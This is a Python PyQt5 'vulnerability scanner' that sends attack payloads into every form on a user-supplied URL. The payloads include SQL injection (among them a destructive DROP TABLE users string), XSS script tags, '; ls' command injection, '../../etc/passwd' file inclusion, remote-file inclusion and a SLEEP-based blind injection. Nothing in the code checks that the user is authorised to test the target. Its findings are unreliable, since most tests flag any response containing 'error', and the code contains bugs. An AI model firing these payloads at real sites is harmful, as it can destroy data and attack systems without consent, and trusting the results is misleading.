import sys
import requests
from bs4 import BeautifulSoup
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton, QTextEdit, QProgressBar, QMessageBox
)
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import QThread, pyqtSignal, Qt, QTimer
import time

class VulnerabilityScanner(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.worker = ScanWorker()
        self.worker.finished.connect(self.scan_finished)
        self.worker.progress.connect(self.update_progress)

    def initUI(self):
        self.setWindowTitle('Vulnerability Scanner')
        self.setWindowIcon(QIcon('icon.png'))
        self.setGeometry(100, 100, 442, 782)  # Updated dimensions

        self.url_label = QLabel('Enter Target URL:', self)
        self.url_input = QLineEdit(self)

        self.scan_button = QPushButton('Scan', self)
        self.scan_button.clicked.connect(self.start_scan)

        self.results_label = QLabel('Results:', self)
        self.results_text = QTextEdit(self)
        self.results_text.setReadOnly(True)

        self.progress_label = QLabel('Progress:', self)
        self.progress_bar = QProgressBar(self)

        self.progress_bar.setMinimum(0)
        self.progress_bar.setMaximum(100)
        self.progress_bar.setValue(0)
        self.progress_bar.setAlignment(Qt.AlignCenter)

        url_layout = QHBoxLayout()
        url_layout.addWidget(self.url_label)
        url_layout.addWidget(self.url_input)
        url_layout.addWidget(self.scan_button)

        main_layout = QVBoxLayout()
        main_layout.addLayout(url_layout)
        main_layout.addWidget(self.progress_label)
        main_layout.addWidget(self.progress_bar)
        main_layout.addWidget(self.results_label)
        main_layout.addWidget(self.results_text)

        self.setLayout(main_layout)

    def start_scan(self):
        url = self.url_input.text().strip()
        if not url.startswith('http'):
            url = 'http://' + url  # Ensure URL starts with http:// or https://

        if not url:
            QMessageBox.warning(self, 'Warning', 'URL cannot be empty!')
            return

        self.scan_button.setEnabled(False)
        self.results_text.clear()
        self.progress_bar.setValue(0)

        self.display_temporary_message("Scanning started...")  # Show temporary message

        self.worker.set_url(url)
        self.worker.start()

    def display_temporary_message(self, message):
        self.results_text.setPlainText(message)
        QTimer.singleShot(3000, self.clear_message)  # Clear message after 3 seconds

    def clear_message(self):
        self.results_text.clear()

    def scan_finished(self, vulnerabilities):
        self.scan_button.setEnabled(True)
        self.display_results(vulnerabilities)

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def display_results(self, vulnerabilities):
        if vulnerabilities:
            result_text = "Vulnerabilities found:\n\n"
            for vuln in vulnerabilities:
                result_text += f"Vulnerability Type: {vuln['Vulnerability Type']}\n"
                result_text += f"Target URL: {vuln['Target URL']}\n"
                result_text += f"Details:\n"
                result_text += f"  Payload: {vuln.get('Payload', '')}\n"
                result_text += f"  Response:\n{vuln['Response']}\n\n"
        else:
            result_text = "No vulnerabilities found."

        self.results_text.setPlainText(result_text)

class ScanWorker(QThread):
    finished = pyqtSignal(list)
    progress = pyqtSignal(int)

    def __init__(self):
        super().__init__()
        self.url = ""

    def set_url(self, url):
        self.url = url

    def run(self):
        vulnerabilities = []
        try:
            response = requests.get(self.url)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            total_forms = len(forms)
            if total_forms == 0:
                self.progress.emit(100)
                self.finished.emit([])
                return

            for index, form in enumerate(forms):
                self.progress.emit(int(((index + 1) / total_forms) * 100))
                vulnerabilities.extend(self.test_sql_injection(self.url, form))
                vulnerabilities.extend(self.test_xss(self.url, form))
                vulnerabilities.extend(self.test_csrf(self.url, form))
                vulnerabilities.extend(self.test_command_injection(self.url, form))
                vulnerabilities.extend(self.test_file_upload_vulnerability(self.url, form))
                vulnerabilities.extend(self.deep_vulnerability_scanning(self.url, form))
                vulnerabilities.extend(self.test_rfi(self.url, form))
                vulnerabilities.extend(self.test_lfi(self.url, form))
                vulnerabilities.extend(self.test_open_redirect(self.url, form))
                vulnerabilities.extend(self.test_security_headers(self.url))
                vulnerabilities.extend(self.test_time_based_blind_sqli(self.url, form))

            self.progress.emit(100)
            self.finished.emit(vulnerabilities)

        except requests.exceptions.RequestException as e:
            QMessageBox.critical(self, 'Error', f"An error occurred: {e}")
            self.finished.emit([])

    def test_sql_injection(self, url, form):
        vulnerabilities = []
        sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' UNION SELECT 1,2,3 --"]

        action = form.get('action')
        if action:
            method = form.get('method', 'get')
            for payload in sql_payloads:
                form_data = {input.get('name'): payload for input in form.find_all('input')}
                try:
                    full_url = url + action
                    if method.lower() == 'post':
                        response = requests.post(full_url, data=form_data)
                    else:
                        response = requests.get(full_url, params=form_data)

                    if "error" in response.text.lower() or "syntax" in response.text.lower():
                        vulnerability_info = {
                            "Vulnerability Type": "SQL Injection",
                            "Target URL": full_url,
                            "Payload": payload,
                            "Response": response.text[:200]
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing SQL Injection: {e}")

        return vulnerabilities

    def test_xss(self, url, form):
        vulnerabilities = []
        xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

        action = form.get('action')
        if action:
            method = form.get('method', 'get')
            for payload in xss_payloads:
                form_data = {input.get('name'): payload for input in form.find_all('input')}
                try:
                    full_url = url + action
                    if method.lower() == 'post':
                        response = requests.post(full_url, data=form_data)
                    else:
                        response = requests.get(full_url, params=form_data)

                    if payload in response.text:
                        vulnerability_info = {
                            "Vulnerability Type": "XSS",
                            "Target URL": full_url,
                            "Payload": payload,
                            "Response": response.text[:200]
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing XSS: {e}")

        return vulnerabilities

    def test_csrf(self, url, form):
        vulnerabilities = []
        action = form.get('action')
        if action:
            method = form.get('method', 'get')
            form_data = {input.get('name'): 'test' for input in form.find_all('input')}
            try:
                full_url = url + action
                if method.lower() == 'post':
                    response = requests.post(full_url, data=form_data)
                else:
                    response = requests.get(full_url, params=form_data)

                if "csrf" not in response.text.lower():
                    vulnerability_info = {
                        "Vulnerability Type": "CSRF",
                        "Target URL": full_url,
                        "Response": response.text[:200]
                    }
                    vulnerabilities.append(vulnerability_info)
            except Exception as e:
                print(f"An error occurred while testing CSRF: {e}")

        return vulnerabilities

    def test_command_injection(self, url, form):
        vulnerabilities = []
        command_injection_payloads = ["; ls", "&& ls"]

        action = form.get('action')
        if action:
            method = form.get('method', 'get')
            for payload in command_injection_payloads:
                form_data = {input.get('name'): payload for input in form.find_all('input')}
                try:
                    full_url = url + action
                    if method.lower() == 'post':
                        response = requests.post(full_url, data=form_data)
                    else:
                        response = requests.get(full_url, params=form_data)

                    if "error" in response.text.lower():
                        vulnerability_info = {
                            "Vulnerability Type": "Command Injection",
                            "Target URL": full_url,
                            "Payload": payload,
                            "Response": response.text[:200]
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing Command Injection: {e}")

        return vulnerabilities

    def test_file_upload_vulnerability(self, url, form):
        vulnerabilities = []
        file_payloads = [("test.txt", "This is a test file")]

        action = form.get('action')
        if action:
            method = form.get('method', 'post')
            for filename, content in file_payloads:
                form_data = {input.get('name'): (filename, content) for input in form.find_all('input') if input.get('type') == 'file'}
                try:
                    full_url = url + action
                    if method.lower() == 'post':
                        response = requests.post(full_url, files=form_data)
                    else:
                        response = requests.get(full_url)

                    if "error" in response.text.lower():
                        vulnerability_info = {
                            "Vulnerability Type": "File Upload Vulnerability",
                            "Target URL": full_url,
                            "Payload": filename,
                            "Response": response.text[:200]
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing File Upload Vulnerability: {e}")

        return vulnerabilities

    def deep_vulnerability_scanning(self, url, form):
        vulnerabilities = []
        # Placeholder for advanced scanning
        # Add specific tests for advanced vulnerabilities here
        return vulnerabilities

    def test_rfi(self, url, form):
        vulnerabilities = []
        rfi_payloads = ["http://example.com/malicious_file"]

        action = form.get('action')
        if action:
            method = form.get('method', 'get')
            for payload in rfi_payloads:
                form_data = {input.get('name'): payload for input in form.find_all('input')}
                try:
                    full_url = url + action
                    if method.lower() == 'post':
                        response = requests.post(full_url, data=form_data)
                    else:
                        response = requests.get(full_url, params=form_data)

                    if "error" in response.text.lower():
                        vulnerability_info = {
                            "Vulnerability Type": "RFI",
                            "Target URL": full_url,
                            "Payload": payload,
                            "Response": response.text[:200]
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing RFI: {e}")

        return vulnerabilities

    def test_lfi(self, url, form):
        vulnerabilities = []
        lfi_payloads = ["../../etc/passwd"]

        action = form.get('action')
        if action:
            method = form.get('method', 'get')
            for payload in lfi_payloads:
                form_data = {input.get('name'): payload for input in form.find_all('input')}
                try:
                    full_url = url + action
                    if method.lower() == 'post':
                        response = requests.post(full_url, data=form_data)
                    else:
                        response = requests.get(full_url, params=form_data)

                    if "error" in response.text.lower():
                        vulnerability_info = {
                            "Vulnerability Type": "LFI",
                            "Target URL": full_url,
                            "Payload": payload,
                            "Response": response.text[:200]
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing LFI: {e}")

        return vulnerabilities

    def test_open_redirect(self, url, form):
        vulnerabilities = []
        open_redirect_payloads = ["http://example.com"]

        action = form.get('action')
        if action:
            method = form.get('method', 'get')
            for payload in open_redirect_payloads:
                form_data = {input.get('name'): payload for input in form.find_all('input')}
                try:
                    full_url = url + action
                    if method.lower() == 'post':
                        response = requests.post(full_url, data=form_data)
                    else:
                        response = requests.get(full_url, params=form_data)

                    if "error" in response.text.lower():
                        vulnerability_info = {
                            "Vulnerability Type": "Open Redirect",
                            "Target URL": full_url,
                            "Payload": payload,
                            "Response": response.text[:200]
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing Open Redirect: {e}")

        return vulnerabilities

    def test_security_headers(self, url):
        vulnerabilities = []
        required_headers = ["X-Content-Type-Options", "X-Frame-Options", "X-XSS-Protection", "Strict-Transport-Security"]

        try:
            response = requests.get(url)
            headers = response.headers

            for header in required_headers:
                if header not in headers:
                    vulnerability_info = {
                        "Vulnerability Type": "Missing Security Header",
                        "Target URL": url,
                        "Payload": header,
                        "Response": "Header missing"
                    }
                    vulnerabilities.append(vulnerability_info)
        except Exception as e:
            print(f"An error occurred while testing Security Headers: {e}")

        return vulnerabilities

    def test_time_based_blind_sqli(self, url, form):
        vulnerabilities = []
        sqli_payloads = ["' OR IF(1=1, SLEEP(5), 0)--"]

        action = form.get('action')
        if action:
            method = form.get('method', 'get')
            for payload in sqli_payloads:
                form_data = {input.get('name'): payload for input in form.find_all('input')}
                try:
                    full_url = url + action
                    if method.lower() == 'post':
                        response = requests.post(full_url, data=form_data)
                    else:
                        response = requests.get(full_url, params=form_data)

                    if response.elapsed.total_seconds() > 5:
                        vulnerability_info = {
                            "Vulnerability Type": "Time-Based Blind SQL Injection",
                            "Target URL": full_url,
                            "Payload": payload,
                            "Response": response.text[:200]
                        }
                        vulnerabilities.append(vulnerability_info)
                except Exception as e:
                    print(f"An error occurred while testing Time-Based Blind SQL Injection: {e}")

        return vulnerabilities

if __name__ == '__main__':
    app = QApplication(sys.argv)
    scanner = VulnerabilityScanner()
    scanner.show()
    sys.exit(app.exec_())
